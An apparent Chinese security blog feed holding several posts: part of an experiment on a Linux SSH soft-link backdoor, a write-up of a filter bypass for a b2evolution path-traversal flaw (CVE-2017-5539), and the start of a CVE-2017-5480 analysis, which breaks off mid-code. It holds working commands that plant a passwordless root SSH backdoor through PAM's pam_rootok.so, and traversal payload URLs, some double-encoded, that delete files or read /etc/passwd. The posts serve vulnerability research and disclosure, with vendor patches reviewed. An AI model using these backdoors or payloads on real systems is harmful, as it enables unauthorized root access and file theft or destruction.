title="ssh_backdoor_1.png"></p><p>实践结果表明禁止sshd使用PAM认证后，ssh登陆不调用PAM，严格验证用户密码，所以不能建立任意密码登录后门。<br>3.软连接的路径及文件名是否有限制<br>首先验证修改路径对后门功能是否有影响，修改软连接路径为<code>/home/su</code><br>被控端执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /home/su;/home/su -oport=12345</span><br></pre></td></tr></table></figure></p><p>客户端ssh root:任意密码@x.x.x.x 12345仍然成功登陆</p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_2.png" alt="修改软连接/home/su" title="ssh_backdoor_2.png"></p><p>实践表明软连接的路径对后门的功能没有影响<br>其次修改软连接文件名对后门功能是否有影响，修改软连接为<code>/tmp/pam_test</code><br>被控端执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/pam_test;/tmp/pam_test -oport=12345</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_3.png" alt="修改软连接为/tmp/pam_test" title="ssh_backdoor_3.png"><br>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>认证失败<br>实践表明软连接的文件名会影响后门功能，而且在ssh开启pam认证的前提下，默认调用的pam配置文件按是软连接的文件名（pam_test）<br>4.此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件<br>在被控端<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"auth sufficient pam_rootok.so"</span> &gt;&gt; /etc/pam.d/hacker</span><br><span class="line">cat /etc/pam.d/hacker</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=12345</span><br></pre></td></tr></table></figure></p><p>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>认证成功</p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_4.png" alt="pam_rootok.so" title="ssh_backdoor_4.png"><br>实践表明通过软连接文件名指定ssh的pam配置文件为hacker,只要文件中包含<code>auth sufficient pam_rootok.so</code>即可无密码登陆<br>最后在<code>etc/pam.d/</code>目录下查找包含<code>pam_rootok.so</code>配置的文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ |xargs grep <span class="string">"pam_rootok"</span></span><br></pre></td></tr></table></figure></p><p>在笔者的测试环境下还有”chsh”、”chfn”包含<code>pam_rootok.so</code><br>被控端执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12346</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oport=12347</span><br></pre></td></tr></table></figure></p><p>客户端<code>ssh root:任意密码@x.x.x.x 12346</code>仍然认证成功<br>客户端<code>ssh root:任意密码@x.x.x.x 12347</code>仍然认证成功</p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_5.png" alt="其他可用后门软连接命名" title="ssh_backdoor_5.png"></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><ol><li>Linux软连接ssh后门需要ssh配置允许PAM认证才能使用</li><li>如果被控主机不允许root登陆可用其他已存在用户登陆</li><li>通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)</li><li>任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>,只要PAM配置文件中包含此配置即可SSH任意密码登陆，实践表明，可成功利用的PAM配置文件除了su还有chsh、chfn</li></ol>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>b2evolution目录遍历bypass之CVE-2017-5539</title>
      <link href="/2017/02/10/CVE-2017-5539/"/>
      <url>/2017/02/10/CVE-2017-5539/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>b2evolution官方针对<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5480" target="_blank" rel="noopener">CVE-2017-5480</a>漏洞修复存在缺陷，可直接bypass删除、读取任意文件（<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5539" target="_blank" rel="noopener">CVE-2017-5539</a>）。<br><a id="more"></a></p><h2 id="0x01-漏洞回顾"><a href="#0x01-漏洞回顾" class="headerlink" title="0x01 漏洞回顾"></a>0x01 漏洞回顾</h2><p>b2evolution小于或等于存在6.8.3版本存在目录遍历漏洞导致删除、读取任意文件，漏洞详细分析见笔者上一篇博客，<a href="http://blackwolfsec.cc/2017/01/18/CVE-2017-5480/">初探CVE漏洞之CVE-2017-5480</a>。<br>官方修复并发布了<a href="http://b2evolution.net/downloads/6-8-4?download=6736" target="_blank" rel="noopener">6.8.4-stable</a>新版本<br>CVE-2017-5480漏洞测试<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/b2evolution/admin.php?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected</span>[<span class="string"></span>]=../../../../../../../../../../../../../../test.txt&amp;fm<span class="emphasis">_sources_</span>root=user<span class="emphasis">_4</span></span><br></pre></td></tr></table></figure></p><p>返回如下图所示，可见官方已修复之前的漏洞</p><p><img src="http://blackwolfsec.cc/static/picture/CVE-2017-5539-1.png" alt="CVE-2017-5480修复"></p><h2 id="0x02-Bypass"><a href="#0x02-Bypass" class="headerlink" title="0x02 Bypass"></a>0x02 Bypass</h2><p>修复方式并不安全，<a href="https://github.com/b2evolution/b2evolution/commit/26841d9c81f27ad23b2f6e4bd5eaec7f2f58dfe0" target="_blank" rel="noopener">补丁地址</a>，补丁部分代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+<span class="comment">// Prevent directory traversal using '..'</span></span><br><span class="line">+$re = <span class="string">'/\/?\.\.\/+/'</span>;</span><br><span class="line"> <span class="keyword">foreach</span>( $fm_selected <span class="keyword">as</span> $l_source_path )</span><br><span class="line"> &#123;</span><br><span class="line">+<span class="keyword">if</span>( preg_match( $re, $l_source_path ) )</span><br><span class="line">+&#123;</span><br><span class="line">+debug_die( <span class="string">'Invalid fm_selected parameter value'</span> );</span><br><span class="line">+&#125;</span><br><span class="line"> $selected_Filelist-&gt;add_by_subpath( urldecode($l_source_path), <span class="keyword">true</span> );</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>分析出作者采取过滤<code>../</code>的方式修复CVE-2017-5480漏洞。然而这种方式并不安全,可直接Bypass,参考<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5539" target="_blank" rel="noopener">CVE-2017-5539</a>。<br>修改payload如下：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//127.0.0.1/b2evolution/admin.php</span>?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected[]=<span class="string">..</span>\<span class="string">/..</span>\<span class="string">/..</span>\<span class="string">/..</span>\<span class="string">/..</span>\<span class="string">/..</span>\<span class="string">/..</span>\<span class="string">/..</span>\<span class="string">/..</span>\<span class="string">/..</span>\<span class="string">/test.txt</span>&amp;fm_sources_root=user_4</span><br></pre></td></tr></table></figure><p><img src="http://blackwolfsec.cc/static/picture/CVE-2017-5539-2.png" alt="payload1"><br>等价的payload如下：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//127.0.0.1/b2evolution/admin.php</span>?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected[]=<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\test.txt&amp;fm_sources_root=user_4</span><br></pre></td></tr></table></figure><p><img src="http://blackwolfsec.cc/static/picture/CVE-2017-5539-3.png" alt="payload2"></p><p>通过同作者联系沟通，得到作者如下回复</p><p><img src="http://blackwolfsec.cc/static/picture/CVE-2017-5539-5.jpg" alt="enter description here"></p><p>作者企图通过直接过滤<code>../</code>和<code>..\</code>的方式修复此漏洞。这样就安全了吗？当然不是（最容易想到的方式是使用绝对路径，但是此处有前缀路径拼接不能成功）<br>在/inc/files/files.ctrl.php文件中发现文件路径参数经过了urldecode处理，部分代码如下。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$selected_Filelist-&gt;add_by_subpath( urldecode($l_source_path), <span class="keyword">true</span> );</span><br></pre></td></tr></table></figure></p><p>所以即使过滤<code>../</code>和<code>..\</code>也存在如下两种方式绕过，<code>..%252f</code>经过urldecode处理后转换为<code>../</code>,<code>..%255c</code>经过urldecode处理后转换为<code>..\</code>,修改payload如下：<br>1.<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://127.0.0.1/b2evolution/admin.php?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected[]=..<span class="number">%252</span>f..<span class="number">%252</span>f..<span class="number">%252</span>f..<span class="number">%252</span>f..<span class="number">%252</span>f..<span class="number">%252</span>f..<span class="number">%252</span>f..<span class="number">%252</span>f..<span class="number">%252</span>f..<span class="number">%252</span>f..<span class="number">%252</span>ftest.txt&amp;fm_sources_root=user_4</span><br></pre></td></tr></table></figure></p><p>2.<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/b<span class="number">2</span>evolution/admin.php?ctrl=files&amp;root=user_<span class="number">4</span>&amp;action=file_copy&amp;fm_selected[]=..<span class="symbol">%255</span><span class="keyword">c</span>..<span class="symbol">%255</span><span class="keyword">c</span>..<span class="symbol">%255</span><span class="keyword">c</span>..<span class="symbol">%255</span><span class="keyword">c</span>..<span class="symbol">%255</span><span class="keyword">c</span>..<span class="symbol">%255</span><span class="keyword">c</span>..<span class="symbol">%255</span><span class="keyword">c</span>..<span class="symbol">%255</span>ctest.txt&amp;fm_sources_root=user_<span class="number">4</span></span><br></pre></td></tr></table></figure></p><p>结果如下图</p><p><img src="http://blackwolfsec.cc/static/picture/CVE-2017-5539-4.png" alt="enter description here"></p><h2 id="0x03-结束语"><a href="#0x03-结束语" class="headerlink" title="0x03 结束语"></a>0x03 结束语</h2><p>官方最终采用以下修复，并发布<a href="http://b2evolution.net/downloads/6-8-5?download=6743" target="_blank" rel="noopener">6.8.5-stable版本</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fm_selected = param( <span class="string">'fm_selected'</span>, <span class="string">'array:filepath'</span>, <span class="keyword">array</span>(), <span class="keyword">true</span> );</span><br></pre></td></tr></table></figure></p><p>array:filepath参数合规性判断的核心函数如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_safe_filepath</span><span class="params">( $filepath )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $filemanager_allow_dotdot_in_filenames;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ! <span class="keyword">isset</span>( $filemanager_allow_dotdot_in_filenames ) )</span><br><span class="line">&#123;<span class="comment">// This config var is required:</span></span><br><span class="line">debug_die( <span class="string">'The var &lt;strong&gt;$filemanager_allow_dotdot_in_filenames&lt;/strong&gt; must be defined in config file.'</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">empty</span>( $filepath ) )</span><br><span class="line">&#123;<span class="comment">// Allow empty file path:</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ! $filemanager_allow_dotdot_in_filenames &amp;&amp;</span><br><span class="line">    strpos( $filepath, <span class="string">'..'</span> ) !== <span class="keyword">false</span> )</span><br><span class="line">&#123;<span class="comment">// Don't allow .. in file path because it is disable by config:</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;<span class="comment">// Decode file path while it is possible:</span></span><br><span class="line">$orig_filepath = $filepath;</span><br><span class="line">$filepath = urldecode( $filepath );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( strpos( $filepath, <span class="string">'../'</span> ) !== <span class="keyword">false</span> || strpos( $filepath, <span class="string">'..\\'</span> ) !== <span class="keyword">false</span> )</span><br><span class="line">&#123;<span class="comment">// Don't allow a traversal directory:</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>( $filepath != $orig_filepath );</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><ul><li>如果管理员设置了不允许文件名包含<code>..</code>，只要检测文件路径包含<code>..</code>即返回false</li><li>循环进行urldecode操作，然后检测文件路径包含<code>../</code>或<code>..\</code>即返回false</li></ul>]]></content>
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>初探CVE漏洞之CVE-2017-5480</title>
      <link href="/2017/01/18/CVE-2017-5480/"/>
      <url>/2017/01/18/CVE-2017-5480/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5480" target="_blank" rel="noopener">CVE-2017-5480</a>，b2evolution小于或等于存在6.8.3版本存在目录遍历漏洞导致删除、读取任意文件。<br><a id="more"></a></p><h2 id="0x01代码审计"><a href="#0x01代码审计" class="headerlink" title="0x01代码审计"></a>0x01代码审计</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>程序下载地址：<a href="http://b2evolution.net/downloads/6-8-3" target="_blank" rel="noopener">6.8.3-stable</a></p><h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h3><p>具有后台访问权限的用户管理文件时，发出请求URL(以dave请求自己头像为例)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/b2evolution/admin.php?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected[]=dave.jpg&amp;fm_sources_root=user_4</span><br></pre></td></tr></table></figure></p><p>函数admin.php中部分源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> $inc_path.$ctrl_mappings[$ctrl];</span><br></pre></td></tr></table></figure></p><p>请求文件为：/b2evolution/inc/files/files.ctrl.php<br>文件files.ctrl.php的部分源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( ($edited_User = &amp; $UserCache-&gt;get_by_ID( $user_ID, <span class="keyword">false</span> )) === <span class="keyword">false</span> )</span><br><span class="line">&#123;<span class="comment">// We could not find the contact to link:</span></span><br><span class="line">$Messages-&gt;add( sprintf( T_(<span class="string">'Requested &amp;laquo;%s&amp;raquo; object does not exist any longer.'</span>), T_(<span class="string">'User'</span>) ), <span class="string">'error'</span> );</span><br><span class="line"><span class="keyword">unset</span>( $edited_User );</span><br><span class="line">forget_param( <span class="string">'user_ID'</span> );</span><br><span class="line"><span class="keyword">unset</span>( $user_ID );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可知<strong>至少需要具有文件编辑（editer）权限的用户才能成功利用</strong></p><ol><li>files.ctrl.php中的任意文件删除漏洞代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $confirmed )</span><br><span class="line">&#123; <span class="comment">// Delete files, It is possible only file has no links:</span></span><br><span class="line">$selected_Filelist-&gt;load_meta();</span><br><span class="line"><span class="keyword">while</span>( $l_File = &amp; $selected_Filelist-&gt;get_next() )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Check if there are delete restrictions on this file:</span></span><br><span class="line">$restriction_Messages = $l_File-&gt;check_relations( <span class="string">'delete_restrictions'</span>, <span class="keyword">array</span>(), <span class="keyword">true</span> );</span><br><span class="line"><span class="keyword">if</span>( $restriction_Messages-&gt;count() )</span><br><span class="line">&#123; <span class="comment">// There are restrictions:</span></span><br><span class="line">$Messages-&gt;add_to_group( $l_File-&gt;get_prefixed_name().<span class="string">': '</span>.T_(<span class="string">'cannot be deleted because of the following relations'</span>)</span><br><span class="line">.$restriction_Messages-&gt;display( <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">false</span>, <span class="keyword">false</span> ), <span class="string">'warning'</span>, T_(<span class="string">'Deleting files...'</span>) );</span><br><span class="line"><span class="comment">// Skip this file</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $l_File-&gt;unlink() )</span><br><span class="line">&#123;</span><br><span class="line">$Messages-&gt;add_to_group( sprintf( ( $l_File-&gt;is_dir() ? T_(<span class="string">'The directory &amp;laquo;%s&amp;raquo; has been deleted.'</span>)</span><br><span class="line">: T_(<span class="string">'The file &amp;laquo;%s&amp;raquo; has been deleted.'</span>) ), $l_File-&gt;dget(<span class="string">'name'</span>) ), <span class="string">'success'</span>, T_(<span class="string">'Deleting files...'</span>) );</span><br><span class="line">$fm_Filelist-&gt;remove( $l_File );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$Messages-&gt;add_to_group( sprintf( ( $l_File-&gt;is_dir() ? T_(<span class="string">'Could not delete the directory &amp;laquo;%s&amp;raquo; (not empty?).'</span>)</span><br><span class="line">: T_(<span class="string">'Could not delete the file &amp;laquo;%s&amp;raquo;.'</span>) ), $l_File-&gt;dget(<span class="string">'name'</span>) ), <span class="string">'error'</span>, T_(<span class="string">'Deleting files...'</span>) );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$action = <span class="string">'list'</span>;</span><br><span class="line">$redirect_to = param( <span class="string">'redirect_to'</span>, <span class="string">'url'</span>, <span class="keyword">NULL</span> );</span><br><span class="line"><span class="comment">// Redirect so that a reload doesn't write to the DB twice:</span></span><br><span class="line">header_redirect( <span class="keyword">empty</span>( $redirect_to ) ? regenerate_url( <span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">'&amp;'</span> ) : $redirect_to, <span class="number">303</span> ); <span class="comment">// Will EXIT</span></span><br><span class="line"><span class="comment">// We have EXITed already at this point!!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// make sure we have loaded metas for all files in selection!</span></span><br><span class="line">$selected_Filelist-&gt;load_meta();</span><br><span class="line">$index = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// Check if there are delete restrictions on the files:</span></span><br><span class="line"><span class="keyword">while</span>( $l_File = &amp; $selected_Filelist-&gt;get_next() )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Check if there are delete restrictions on this file:</span></span><br><span class="line">$restriction_Messages = $l_File-&gt;check_relations( <span class="string">'delete_restrictions'</span>, <span class="keyword">array</span>(), <span class="keyword">true</span> );</span><br><span class="line"><span class="keyword">if</span>( $restriction_Messages-&gt;count() )</span><br><span class="line">&#123; <span class="comment">// There are restrictions:</span></span><br><span class="line">$Messages-&gt;add( $l_File-&gt;get_prefixed_name().<span class="string">': '</span>.T_(<span class="string">'cannot be deleted because of the following relations'</span>)</span><br><span class="line">.$restriction_Messages-&gt;display( <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">false</span>, <span class="keyword">false</span> ) );</span><br><span class="line"><span class="comment">// remove it from the list of selected files (that will be offered to delete):</span></span><br><span class="line">$selected_Filelist-&gt;remove( $l_File );</span><br><span class="line"><span class="keyword">unset</span>( $fm_selected[$index] );</span><br><span class="line">&#125;</span><br><span class="line">$index++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( ! $selected_Filelist-&gt;count() )</span><br><span class="line">&#123; <span class="comment">// no files left in list, cancel action</span></span><br><span class="line">$action = <span class="string">'list'</span>;</span><br><span class="line"><span class="comment">// Redirect so that a reload doesn't write to the DB twice:</span></span><br><span class="line">header_redirect( regenerate_url( <span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">'&amp;'</span> ), <span class="number">303</span> ); <span class="comment">// Will EXIT</span></span><br><span class="line"><span class="comment">// We have EXITed already at this point!!</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>任意文件删除漏洞代码利用Payload:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/b2evolution/</span>admin.php?blog=<span class="number">6</span>&amp;ctrl=files&amp;root=collection_6&amp;fm_hide_dirtree=-<span class="number">1</span>&amp;action=<span class="keyword">delete</span>&amp;fm_selected[]=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/./</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>test.txt&amp;crumb_file=FXTab96veYnFmNDbfHfVJ3BxCHq7NNs1</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/CVE-2017-480_delete1.png" alt="删除文件1"></p><p><img src="http://blackwolfsec.cc/static/picture/CVE-2017-480_delete2.png" alt="删除文件2"></p><ol start="2"><li>files.ctrl.php中的任意文件读取漏洞代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'copy'</span>:</span><br><span class="line">……</span><br><span class="line">$allow_locked_filetypes = $current_User-&gt;check_perm( <span class="string">'files'</span>, <span class="string">'all'</span> );</span><br><span class="line">……</span><br><span class="line"><span class="comment">// Copy file</span></span><br><span class="line">$old_path = $loop_src_File-&gt;get_rdfp_rel_path();</span><br><span class="line">$new_path = $selected_Filelist-&gt;get_rds_list_path().$new_names[$loop_src_File-&gt;get_md5_ID()];</span><br><span class="line"><span class="keyword">if</span>( $old_path == $new_path &amp;&amp; $loop_src_File-&gt;_FileRoot-&gt;ID == $selected_Filelist-&gt;_FileRoot-&gt;ID )</span><br><span class="line">&#123; <span class="comment">// File path has not changed...</span></span><br><span class="line">$Messages-&gt;add_to_group( sprintf( T_(<span class="string">'«%s» has not been copied'</span>), $old_path ), <span class="string">'note'</span>, T_(<span class="string">'Copying files:'</span>) );</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Get a pointer on dest file</span></span><br><span class="line">$dest_File = &amp; $FileCache-&gt;get_by_root_and_path( $selected_Filelist-&gt;get_root_type(), $selected_Filelist-&gt;get_root_ID(), $new_path );</span><br><span class="line"><span class="comment">// Perform copy:</span></span><br><span class="line"><span class="keyword">if</span>( ! $loop_src_File-&gt;copy_to( $dest_File ) )</span><br><span class="line">&#123; <span class="comment">// failed</span></span><br><span class="line">$Messages-&gt;add_to_group( sprintf( T_(<span class="string">'«%s» could not be copied to «%s»'</span>), $old_path, $new_path ), <span class="string">'error'</span><span class="string">'Copying files:'</span>) );</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">$success_message = sprintf( T_(<span class="string">'«%s» has been successfully copied to «%s»'</span>), $old_path, $new_path );</span><br><span class="line">$success_title = T_(<span class="string">'Copying files:'</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>任意文件读取漏洞代码利用Payload:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/b2evolution/</span>admin.php?blog=<span class="number">6</span>&amp;ctrl=files&amp;root=collection_6&amp;fm_hide_dirtree=-<span class="number">1</span>&amp;action=file_copy&amp;fm_selected[]=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc<span class="regexp">/passwd&amp;fm_sources_root=collection_6</span></span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/CVE-2017-480_read1.png" alt="读文件1"><br>files.ctrl.php中重命名时文件扩展名限制代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 